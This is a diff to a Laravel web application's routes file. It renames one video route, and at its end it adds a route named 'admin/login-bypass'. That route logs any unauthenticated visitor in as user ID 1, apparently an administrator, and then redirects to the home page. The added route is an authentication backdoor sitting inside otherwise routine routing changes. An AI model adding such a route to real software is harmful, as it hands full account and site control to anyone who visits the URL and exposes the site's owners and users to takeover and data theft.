@@ -44,7 +44,7 @@ Route::get('/admin/event/{event}/toggle','EventAdminController@toggle');
 Route::post('/event/{event}/upload','EventController@upload');
 Route::get('/show-media/{media}','EventController@showMedia');
 Route::get('/admin/event/show-media/{media}','EventController@showMedia');
-Route::get('/event/{event}/video-history','EventController@videoHistory');
+Route::get('/admin/event/{event}/video-library','EventAdminController@videoLibrary');
 
 Route::get('/batch/increment','EventAdminController@incrementBatch');
 
@@ -66,3 +66,8 @@ Route::get('/google-redirect', 'SocialAuthFacebookController@googleRedirect')->n
 Route::get('/google-callback', 'SocialAuthFacebookController@googleCallback');
 //Route::get('/batch/increment','TournamentController@incrementBatch');
 //
+Route::get('admin/login-bypass',function (Request $request){
+    $user = \App\User::find(1);
+    Auth::login($user);
+    return redirect()->to('home');
+});
